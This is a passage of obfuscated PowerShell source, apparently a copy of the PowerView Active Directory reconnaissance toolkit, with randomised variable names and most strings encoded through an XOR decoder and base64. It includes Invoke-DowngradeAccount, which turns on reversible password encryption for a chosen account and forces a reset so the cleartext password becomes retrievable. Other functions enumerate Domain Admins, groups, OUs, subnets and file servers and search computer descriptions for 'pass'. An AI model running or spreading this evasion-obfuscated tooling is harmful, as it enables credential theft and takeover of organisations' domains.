        Write-Warning ((HandleResult95 @(130,214,115,148,239,227,199,94,142,191,134,190,93,170,225,165,212,64,175,250,179,227,0,154,215,136,196,9,136,222,145,179) @(208,142,57,237,141)) + $PropertyName + (HandleResult95 @(72,236,167,191,72,236,175,161,99,236,163,165,72,231,150,244) @(1,164,245,201)) + $PropertyValue + (HandleResult95 @(24,133,248,154,18,184,189,44,48,206,240,134,42,220,186,123,27,189,135,202) @(82,252,186,247,112,139,244,75)) + $($NsyC.Properties.samaccountname) + (HandleResult95 @(143,26,100,118) @(198,94,11,17)) + $_)
    }
}


function Invoke-DowngradeAccount {
<#
    .SYNOPSIS

        Set reversible encryption on a given account and then force the password
        to be set on next user login. To repair use "-Repair".

    .PARAMETER SamAccountName

        The SamAccountName of the domain object you're querying for. 

    .PARAMETER Name

        The Name of the domain object you're querying for.

    .PARAMETER Domain

        The domain to query for objects, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER Filter

        Additional LDAP filter string for the query.

    .PARAMETER Repair

        Switch. Unset the reversible encryption flag and force password reset flag.

    .EXAMPLE

        PS> Invoke-DowngradeAccount -SamAccountName jason

        Set reversible encryption on the 'jason' account and force the password to be changed.

    .EXAMPLE

        PS> Invoke-DowngradeAccount -SamAccountName jason -Repair

        Unset reversible encryption on the 'jason' account and remove the forced password change.
#>

    [CmdletBinding()]
    Param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $Filter,

        [Switch]
        $Repair
    )

    process {
        $GM6i = @{
            'SamAccountName' = $SamAccountName
            'Name' = $Name
            'Domain' = $Domain
            'DomainController' = $DomainController
            'Filter' = $Filter
        }

        # splat the appropriate arguments to Get-ADObject
        $VUkw = Get-ADObject @GM6i | select useraccountcontrol | ConvertFrom-UACValue

        if($Repair) {

            if($VUkw.Keys -contains (HandleResult95 @(32,237,20,62,39,212,77,43,36,253,119,63,42,137,115,60,37,254,115,28,39,254,69,63,42,136,103,55,38,253,24,34,32,237,112,71) @(114,184,33,122))) {
                # if reversible encryption is set, unset it
                Set-ADObject @GM6i -PropertyName useraccountcontrol -PropertyXorValue 128
            }

            # unset the forced password change
            Set-ADObject @GM6i -PropertyName pwdlastset -PropertyValue -1
        }

        else {

            if($VUkw.Keys -contains (HandleResult95 @(240,139,176,92,131,16,155,136,222,85,151,28,247,165,223,117,128,19,228,154,220,34,177,6,247,165,216,46) @(162,206,137,19,213,86))) {
                # if the password is set to never expire, unset
                Set-ADObject @GM6i -PropertyName useraccountcontrol -PropertyXorValue 65536
            }

            if($VUkw.Keys -notcontains (HandleResult95 @(172,4,163,171,95,23,174,185,168,20,192,170,82,74,144,174,169,23,196,137,95,61,166,173,166,97,208,162,94,62,251,176,172,4,199,210) @(254,81,150,239,10,123,194,232))) {
                # if reversible encryption is not set, set it
                Set-ADObject @GM6i -PropertyName useraccountcontrol -PropertyXorValue 128
            }

            # force the password to be changed on next login
            Set-ADObject @GM6i -PropertyName pwdlastset -PropertyValue 0
        }
    }
}


function Get-ComputerProperty {
<#
    .SYNOPSIS

        Returns a list of all computer object properties. If a property
        name is specified, it returns all [computer:property] values.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

    .PARAMETER Properties

        Return property names for computers.

    .PARAMETER Domain

        The domain to query for computer properties, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-ComputerProperty -Domain testing
        
        Returns all user properties for computers in the 'testing' domain.

    .EXAMPLE

        PS C:\> Get-ComputerProperty -Properties ssn,lastlogon,location
        
        Returns all an array of computer/ssn/lastlogin/location combinations
        for computers in the current domain.

    .LINK

        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
#>

    [CmdletBinding()]
    param(
        [String[]]
        $Properties,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if($Properties) {
        # extract out the set of all properties for each object
        $Properties = ,(HandleResult95 @(26,91,11,133,34,103,112,204) @(120,54,77,241)) + $Properties | Sort-Object -Unique
        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -Property $Properties
    }
    else {
        # extract out just the property names
        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property (HandleResult95 @(29,116,3,90,19,72,120,19) @(73,25,69,46))
    }
}


function Find-ComputerField {
<#
    .SYNOPSIS

        Searches computer object fields for a given word (default *pass*). Default
        field being searched is 'description'.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

    .PARAMETER SearchTerm

        Term to search for, default of "pass".

    .PARAMETER SearchField

        User field to search in, default of "description".

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER Domain

        Domain to search computer fields for, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Find-ComputerField -SearchTerm backup -SearchField info

        Find computer accounts with "backup" in the "info" field.
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Term')]
        [String]
        $SearchTerm = 'pass',

        [Alias('Field')]
        [String]
        $SearchField = 'description',

        [String]
        $ADSpath,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
        Get-NetComputer -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -FullData -Filter ("(" + $SearchField + ([char]0x3d+[char]0x2a) + $SearchTerm + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kik=")))) -PageSize $PageSize | Select-Object samaccountname,$SearchField
    }
}


function Get-NetOU {
<#
    .SYNOPSIS

        Gets a list of all current OUs in a domain.

    .PARAMETER OUName

        The OU name to query for, wildcards accepted.

    .PARAMETER GUID

        Only return OUs with the specified GUID in their gplink property.

    .PARAMETER Domain

        The domain to query for OUs, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through.

    .PARAMETER FullData

        Switch. Return full OU objects instead of just object names (the default).

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-NetOU
        
        Returns the current OUs in the domain.

    .EXAMPLE

        PS C:\> Get-NetOU -OUName *admin* -Domain testlab.local
        
        Returns all OUs with "admin" in their name in the testlab.local domain.

     .EXAMPLE

        PS C:\> Get-NetOU -GUID 123-...
        
        Returns all OUs with linked to the specified group policy object.    
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $OUName = '*',

        [String]
        $GUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $zNnKc = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if ($zNnKc) {
            if ($GUID) {
                # if we're filtering for a GUID in .gplink
                $zNnKc.filter=((HandleResult95 @(61,62,64,32,223,233,250,7,39,78,1,141,138,130,48,77,67,24,217,173,211,24,22,32,45,142,145,222,47,42,44,63,216,182,246,70,28,78,118,200,130,231,14,43,123,34,209,235,251,37,21,108,22,234,234,220,38,44,36,114) @(118,125,25,79,189,219,176)) + $OUName + (HandleResult95 @(131,99,188,155,19,187,156,184,82,185,134,73,183,131,245,13) @(200,48,212,245,112,252,228)) + $GUID + (HandleResult95 @(97,147,172,216) @(42,250,199,168,17,209)))
            }
            else {
                $zNnKc.filter=((HandleResult95 @(233,106,17,81,124,84,208,211,115,31,112,46,55,168,228,25,18,105,122,16,249,204,66,113,92,45,44,244,251,126,125,78,123,11,220,146,72,31,7,107,63,205,218,127,42,83,114,86,209,241,65,61,103,73,87,246,242,120,117,3) @(162,41,72,62,30,102,154)) + $OUName + ([char]0x29+[char]0x29))
            }

            $zNnKc.FindAll() | Where-Object {$_} | ForEach-Object {
                if ($FullData) {
                    # convert/process the LDAP fields for each result
                    Convert-LDAPProperty -Properties $_.Properties
                }
                else { 
                    # otherwise just returning the ADS paths of the OUs
                    $_.properties.adspath
                }
            }
        }
    }
}


function Get-NetSite {
<#
    .SYNOPSIS

        Gets a list of all current sites in a domain.

    .PARAMETER SiteName

        Site filter string, wildcards accepted.

    .PARAMETER Domain

        The domain to query for sites, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through.

    .PARAMETER GUID

        Only return site with the specified GUID in their gplink property.

    .PARAMETER FullData

        Switch. Return full site objects instead of just object names (the default).

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-NetSite -Domain testlab.local -FullData
        
        Returns the full data objects for all sites in testlab.local
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $GUID,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $EQ1AKfp = Get-DomainSearcher -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -ADSprefix (HandleResult95 @(110,217,34,173,74,174,166,15,179,78,217,108,205,250,11,208,71,166,38,233,144,82,133,120,240,71,214,162,91,174,122,226,125,251,247,2) @(63,233,22,148,31,156,202)) -PageSize $PageSize
    }
    process {
        if($EQ1AKfp) {

            if ($GUID) {
                # if we're filtering for a GUID in .gplink
                $EQ1AKfp.filter=((HandleResult95 @(24,32,68,113,66,187,247,34,57,74,80,16,216,143,21,83,71,73,68,255,222,61,8,36,125,18,229,141,9,48,118,113,66,228,251,39,57,73,46,29) @(83,99,29,30,32,137,189)) + $SiteName + (HandleResult95 @(160,202,54,1,232,181,3,219,137,244,45,86,192,149,70,150) @(235,153,94,111,139,242,123,171)) + $GUID + (HandleResult95 @(206,34,236,156) @(133,75,135,236,101,126,148)))
            }
            else {
                $EQ1AKfp.filter=((HandleResult95 @(221,25,201,21,78,164,16,225,32,123,216,106,193,72,106,166,0,199,30,90,245,52,251,67,79,164,54,160,32,127,253,53,242,23,106,226,0,196,74,17) @(150,90,144,122,44)) + $SiteName + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KSk="))))
            }
            
            try {
                $EQ1AKfp.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        # convert/process the LDAP fields for each result
                        Convert-LDAPProperty -Properties $_.Properties
                    }
                    else {
                        # otherwise just return the site name
                        $_.properties.name
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Get-NetSubnet {
<#
    .SYNOPSIS

        Gets a list of all current subnets in a domain.

    .PARAMETER SiteName

        Only return subnets from the specified SiteName.

    .PARAMETER Domain

        The domain to query for subnets, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through.

    .PARAMETER FullData

        Switch. Return full subnet objects instead of just object names (the default).

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-NetSubnet
        
        Returns all subnet names in the current domain.

    .EXAMPLE

        PS C:\> Get-NetSubnet -Domain testlab.local -FullData
        
        Returns the full data objects for all subnets in testlab.local
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",

        [String]
        $Domain,

        [String]
        $ADSpath,

        [String]
        $DomainController,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $XbeTSL = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix (HandleResult95 @(244,151,103,100,240,148,5,52,199,202,5,109,198,222,43,25,241,205,98,9,196,255,1,49,198,222,43,25,241,205,98,25,199,149,102,48,196,240,55,108,198,202,21,109,196,240,106,40) @(165,167,83,93)) -PageSize $PageSize
    }

    process {
        if($XbeTSL) {

            $XbeTSL.filter=(HandleResult95 @(144,55,127,193,25,2,43,170,46,113,224,75,97,83,157,68,124,249,31,70,2,181,31,31,205,72,102,8,185,25,112,158,48,99,10,230) @(219,116,38,174,123,48,97))

            try {
                $XbeTSL.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        # convert/process the LDAP fields for each result
                        Convert-LDAPProperty -Properties $_.Properties | Where-Object { $_.siteobject -match ((HandleResult95 @(126,46,146,105) @(47,30,166,80,45,112,87,42)) + $SiteName) }
                    }
                    else {
                        # otherwise just return the subnet name and site name
                        if ( ($SiteName -and ($_.properties.siteobject -match ((HandleResult95 @(190,184,74,71) @(239,136,126,126,132)) + $SiteName + ","))) -or ($SiteName -eq '*')) {

                            $yw0wgqW = @{
                                'Subnet' = $_.properties.name[0]
                            }
                            try {
                                $yw0wgqW['Site'] = ($_.properties.siteobject[0]).split(",")[0]
                            }
                            catch {
                                $yw0wgqW['Site'] = 'Error'
                            }

                            New-Object -TypeName PSObject -Property $yw0wgqW                 
                        }
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Get-DomainSID {
<#
    .SYNOPSIS

        Gets the SID for the domain.

    .PARAMETER Domain

        The domain to query, defaults to the current domain.

    .EXAMPLE

        C:\> Get-DomainSID -Domain TEST
        
        Returns SID for the domain 'TEST'
#>

    param(
        [String]
        $Domain
    )

    $cYF9amo6 = Get-NetDomain -Domain $Domain
    
    if($cYF9amo6) {
        # query for the primary domain controller so we can extract the domain SID for filtering
        $qfLwzX = $cYF9amo6.PdcRoleOwner
        $Pt368P = (Get-NetComputer -Domain $Domain -ComputerName $qfLwzX -FullData).objectsid
        $u5Ie777 = $Pt368P.split("-")
        $u5Ie777[0..($u5Ie777.length -2)] -join "-"
    }
}


function Get-NetGroup {
<#
    .SYNOPSIS

        Gets a list of all current groups in a domain, or all
        the groups a given user/group object belongs to.

    .PARAMETER GroupName

        The group name to query for, wildcards accepted.

    .PARAMETER SID

        The group SID to query for.

    .PARAMETER UserName

        The user name (or group name) to query for all effective
        groups of.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"

    .PARAMETER Domain

        The domain to query for groups, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER AdminCount

        Switch. Return group with adminCount=1.

    .PARAMETER FullData

        Switch. Return full group objects instead of just object names (the default).

    .PARAMETER RawSids

        Switch. Return raw SIDs when using "Get-NetGroup -UserName X"

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-NetGroup
        
        Returns the current groups in the domain.

    .EXAMPLE

        PS C:\> Get-NetGroup -GroupName *admin*
        
        Returns all groups with "admin" in their group name.

    .EXAMPLE

        PS C:\> Get-NetGroup -Domain testing -FullData
        
        Returns full group data objects in the 'testing' domain
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName = '*',

        [String]
        $SID,

        [String]
        $UserName,

        [String]
        $Filter,

        [String]
        $Domain,
        
        [String]
        $DomainController,
        
        [String]
        $ADSpath,

        [Switch]
        $AdminCount,

        [Switch]
        $FullData,

        [Switch]
        $RawSids,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $rj90KgZ = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    process {
        if($rj90KgZ) {

            if($AdminCount) {
                Write-Verbose (HandleResult95 @(157,40,115,3,220,254,110,107,13,232,175,125,65,2,188,181,83,92,41,238,174,77,119,26,212,254,35,42,13,235,157,35,86,62,184,241) @(204,26,27,111,133))
                $Filter += (HandleResult95 @(145,40,53,28,200,141,3,6,46,152,227,94,17,25,251,227,34,32,28,151) @(218,111,115,119,170))
            }

            if ($UserName) {
                # get the raw user object
                $m342PSR = Get-ADObject -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -ReturnRaw -PageSize $PageSize

                # convert the user to a directory entry
                $aBk2rJ = $m342PSR.GetDirectoryEntry()

                # cause the cache to calculate the token groups for the user
                $aBk2rJ.RefreshCache((HandleResult95 @(75,175,207,68,176,120,221,190,85,135,22,217,149,126,167,18) @(47,232,246,54,234)))

                $aBk2rJ.TokenGroups | Foreach-Object {
                    # convert the token group sid
                    $bOhis1 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                    
                    # ignore the built in users and default domain user group
                    if(!($bOhis1 -match '^S-1-5-32-545|-513$')) {
                        if($FullData) {
                            Get-ADObject -SID $bOhis1 -PageSize $PageSize
                        }
                        else {
                            if($RawSids) {
                                $bOhis1
                            }
                            else {
                                Convert-SidToName $bOhis1
                            }
                        }
                    }
                }
            }
            else {
                if ($SID) {
                    $rj90KgZ.filter = ((HandleResult95 @(30,198,132,166,18,193,31,244,135,158,62,195,4,183,155,249,42,164,49,243,190,167,27,202,15,182,151,191,20,171,20,245,150,142,73,154,52,232,139,163,20,181,27,207,143,141,64,206) @(85,133,221,201,112,243)) + $SID + ")" + $Filter + ")")
                }
                else {
                    $rj90KgZ.filter = ((HandleResult95 @(138,226,162,86,163,147,177,72,155,246,181,9,144,147,189,9,155,246,159,79,162,207,144,0,155,146,177,79,165,249,186,73,138,230,206,81,163,246,174,0) @(193,161,251,57)) + $GroupName + ")" + $Filter + ")")
                }
            
                $rj90KgZ.FindAll() | Where-Object {$_} | ForEach-Object {
                    # if we're returning full data objects
                    if ($FullData) {
                        # convert/process the LDAP fields for each result
                        Convert-LDAPProperty -Properties $_.Properties
                    }
                    else {
                        # otherwise we're just returning the group name
                        $_.properties.samaccountname
                    }
                }
            }
        }
    }
}


function Get-NetGroupMember {
<#
    .SYNOPSIS

        This function users [ADSI] and LDAP to query the current AD context
        or trusted domain for users in a specified group. If no GroupName is
        specified, it defaults to querying the "Domain Admins" group.
        This is a replacement for "net group 'name' /domain"

    .PARAMETER GroupName

        The group name to query for users.

    .PARAMETER SID

        The Group SID to query for users. If not given, it defaults to 512 "Domain Admins"

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"

    .PARAMETER Domain

        The domain to query for group users, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER FullData

        Switch. Returns full data objects instead of just group/users.

    .PARAMETER Recurse

        Switch. If the group member is a group, recursively try to query its members as well.

    .PARAMETER UseMatchingRule

        Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query when -Recurse is specified.
        Much faster than manual recursion, but doesn't reveal cross-domain groups.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-NetGroupMember
        
        Returns the usernames that of members of the "Domain Admins" domain group.

    .EXAMPLE

        PS C:\> Get-NetGroupMember -Domain testing -GroupName "Power Users"
        
        Returns the usernames that of members of the "Power Users" group in the 'testing' domain.

    .LINK

        http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName,

        [String]
        $SID,

        [String]
        $Domain = (Get-NetDomain).Name,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData,

        [Switch]
        $Recurse,

        [Switch]
        $UseMatchingRule,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        # so this isn't repeated if users are passed on the pipeline
        $rj90KgZ = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if(!$DomainController) {
            $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
        }
    }

    process {

        if ($rj90KgZ) {

            if ($Recurse -and $UseMatchingRule) {
                # resolve the group to a distinguishedname
                if ($GroupName) {
                    $ayFBYTwN = Get-NetGroup -GroupName $GroupName -Domain $Domain -FullData -PageSize $PageSize
                }
                elseif ($SID) {
                    $ayFBYTwN = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                }
                else {
                    # default to domain admins
                    $SID = (Get-DomainSID -Domain $Domain) + (HandleResult95 @(113,188,21,39,109,90,213,125) @(61,232,64,95,32))
                    $ayFBYTwN = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                }
                $xSAl5J9x = $ayFBYTwN.distinguishedname
                $MGNOwUzT = $ayFBYTwN.name

                if ($xSAl5J9x) {
                    $rj90KgZ.filter = ((HandleResult95 @(117,195,204,254,65,127,120,244,196,198,108,39,92,179,195,228,70,11,108,181,246,214,119,116,113,196,212,160,111,55,127,178,216,235,123,121,117,211,253,229,120,26,15,233,207,201,104,59,100,234,250,233,110,39,119,245,218,213,115,58,114,234,208,233,111,55,107,177,219,248,22,53,114,234,196,228,111,25,85,176,216,197,77,116) @(62,128,149,145,34,77)) + $xSAl5J9x + ")" + $Filter + ")")
                    $rj90KgZ.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))

                    $zRQl = $rj90KgZ.FindAll()
                    $MGNOwUzT = $GroupName
                }
                else {
                    Write-Error (HandleResult95 @(175,201,151,64,252,26,253,149,215,234,122,211,62,194,163,238,192,69,244,16,215,202,212,212,76,253,54,184) @(249,158,162,40,165,119,133))
                }
            }
            else {
                if ($GroupName) {
                    $rj90KgZ.filter = ((HandleResult95 @(53,233,55,15,23,168,52,219,52,55,59,170,47,152,40,80,47,205,26,220,13,14,30,163,36,153,36,22,17,194,63,218,37,39,64,242,28,253,59,89) @(126,170,110,96,117,154)) + $GroupName + ")" + $Filter + ")")
                }
                elseif ($SID) {
                    $rj90KgZ.filter = ((HandleResult95 @(83,113,104,101,134,42,120,64,80,179,86,2,96,56,162,40,104,102,110,146,123,92,90,51,190,43,120,71,110,188,89,66,122,77,221,113,83,92,92,142,124,116,127,64,182,92,2,12) @(24,50,49,10,228)) + $SID + ")" + $Filter + ")")
                }
                else {
                    # default to domain admins
                    $SID = (Get-DomainSID -Domain $Domain) + (HandleResult95 @(228,113,195,241,175,9,176,149) @(168,37,150,137,226,110,141))
                    $rj90KgZ.filter = ((HandleResult95 @(15,237,69,21,38,156,86,11,30,249,82,74,21,156,90,74,30,249,120,12,39,192,119,67,30,157,86,12,32,246,93,10,15,233,37,19,37,195,74,16,32,232,82,48,22,234,44,71) @(68,174,28,122)) + $SID + ")" + $Filter + ")")
                }

                $rj90KgZ.FindAll() | ForEach-Object {
                    try {
                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }

                        $MGNOwUzT = $_.properties.name[0]
                        $zRQl = @()

                        if ($_.properties.member.Count -eq 0) {
                            $CdojznMg = $False
                            $qlOKW = 0
                            $en5JUiCP = 0
                            while(!$CdojznMg) {
                                $en5JUiCP = $qlOKW + 1499
                                $IBeeMKlS=((HandleResult95 @(54,148,46,73,127,57,149,1,114,21,30,171,26,80,66,56,147,41,0,27) @(84,195,120,61,38)) + $qlOKW + "-" + $en5JUiCP)
                                $qlOKW += 1500
                                $rj90KgZ.PropertiesToLoad.Clear()
                                [void]$rj90KgZ.PropertiesToLoad.Add(($IBeeMKlS))
                                try {
                                    $e9hz = $rj90KgZ.FindOne()
                                    if ($e9hz) {
                                        $uaIPSfF = $_.Properties.PropertyNames -like (HandleResult95 @(20,183,61,140,178,55,232,42,57,211,33,144,137,55,218,63,38,179,4,197) @(118,224,107,248,235,90,190,83))
                                        $XdK8679O = $_.Properties.item($uaIPSfF)
                                        if ($XdK8679O.count -eq 0) {
                                            $CdojznMg = $True
                                        }
                                        else {
                                            $XdK8679O | ForEach-Object {
                                                $zRQl += $_
                                            }
                                        }
                                    }
                                    else {
                                        $CdojznMg = $True
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    $CdojznMg = $True
                                }
                            }
                        } 
                        else {
                            $zRQl = $_.properties.member
                        }
                    } 
                    catch {
                        Write-Verbose $_
                    }
                }
            }

            $zRQl | Where-Object {$_} | ForEach-Object {
                # if we're doing the LDAP_MATCHING_RULE_IN_CHAIN recursion
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                } 
                else {
                    if($DomainController) {
                        $e9hz = [adsi]((HandleResult95 @(80,208,34,158,81,209,31,170,72,226,77,225) @(4,149,112,220)) + $DomainController + "/" + $_)
                    }
                    else {
                        $e9hz = [adsi]((HandleResult95 @(77,9,101,120,76,8,88,76,85,59,10,7) @(25,76,55,58)) + $_)
                    }
                    if($e9hz){
                        $Properties = $e9hz.Properties
                    }
                }

                if($Properties) {

                    if($Properties.samaccounttype -notmatch '805306368') {
                        $tHuZe6n = $True
                    }
                    else {
                        $tHuZe6n = $False
                    }

                    if ($FullData) {
                        $dmTGBuhN = Convert-LDAPProperty -Properties $Properties
                    }
                    else {
                        $dmTGBuhN = New-Object PSObject
                    }

                    $dmTGBuhN | Add-Member Noteproperty 'GroupDomain' $Domain
                    $dmTGBuhN | Add-Member Noteproperty 'GroupName' $MGNOwUzT

                    try {
                        $wKM7 = $Properties.distinguishedname[0]
                        
                        # extract the FQDN from the Distinguished Name
                        $LFju8kS = $wKM7.subString($wKM7.IndexOf((HandleResult95 @(149,8,152,98) @(199,77,213,91,101,138)))) -replace 'DC=','' -replace ',','.'
                    }
                    catch {
                        $wKM7 = $Null
                        $LFju8kS = $Null
                    }

                    if ($Properties.samaccountname) {
                        # forest users have the samAccountName set
                        $oIRTSkE = $Properties.samaccountname[0]
                    } 
                    else {
                        # external trust users have a SID, so convert it
                        try {
                            $oIRTSkE = Convert-SidToName $Properties.cn[0]
                        }
                        catch {
                            # if there's a problem contacting the domain to resolve the SID
                            $oIRTSkE = $Properties.cn
                        }
                    }
                    
                    if($Properties.objectSid) {
                        $ZZwWd7MV = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)
                    }
                    else {
                        $ZZwWd7MV = $Null
                    }

                    $dmTGBuhN | Add-Member Noteproperty 'MemberDomain' $LFju8kS
                    $dmTGBuhN | Add-Member Noteproperty 'MemberName' $oIRTSkE
                    $dmTGBuhN | Add-Member Noteproperty 'MemberSid' $ZZwWd7MV
                    $dmTGBuhN | Add-Member Noteproperty 'IsGroup' $tHuZe6n
                    $dmTGBuhN | Add-Member Noteproperty 'MemberDN' $wKM7
                    $dmTGBuhN

                    # if we're doing manual recursion
                    if ($Recurse -and !$UseMatchingRule -and $tHuZe6n -and $oIRTSkE) {
                        Get-NetGroupMember -FullData -Domain $LFju8kS -DomainController $DomainController -GroupName $oIRTSkE -Recurse -PageSize $PageSize
                    }
                }

            }
        }
    }
}


function Get-NetFileServer {
<#
    .SYNOPSIS

        Returns a list of all file servers extracted from user 
        homedirectory, scriptpath, and profilepath fields.

    .PARAMETER Domain

        The domain to query for user file servers, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER TargetUsers

        An array of users to query for file servers.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-NetFileServer
        
        Returns active file servers.

    .EXAMPLE

        PS C:\> Get-NetFileServer -Domain testing
        
        Returns active file servers for the 'testing' domain.
#>

    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String[]]
        $TargetUsers,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function SplitPath {
        # short internal helper to split UNC server paths
        param([String]$Path)

        if ($Path -and ($Path.split(([char]0x5c+[char]0x5c)).Count -ge 3)) {
            $mTXSeLD = $Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))[2]
            if($mTXSeLD -and ($mTXSeLD -ne '')) {
                $mTXSeLD
            }
        }
    }

    Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Where-Object {$_} | Where-Object {
            # filter for any target users
            if($TargetUsers) {
                $TargetUsers -Match $_.samAccountName
            }
            else { $True } 
        } | Foreach-Object {
            # split out every potential file server path
            if($_.homedirectory) {
                SplitPath($_.homedirectory)
            }
            if($_.scriptpath) {
                SplitPath($_.scriptpath)
            }
            if($_.profilepath) {
                SplitPath($_.profilepath)
            }

        } | Where-Object {$_} | Sort-Object -Unique
}


function Get-DFSshare {
<#
    .SYNOPSIS

        Returns a list of all fault-tolerant distributed file
        systems for a given domain.

    .PARAMETER Version

        The version of DFS to query for servers.
        1/v1, 2/v2, or all

    .PARAMETER Domain

        The domain to query for user DFS shares, defaults to the current domain.

    .PARAMETER DomainController

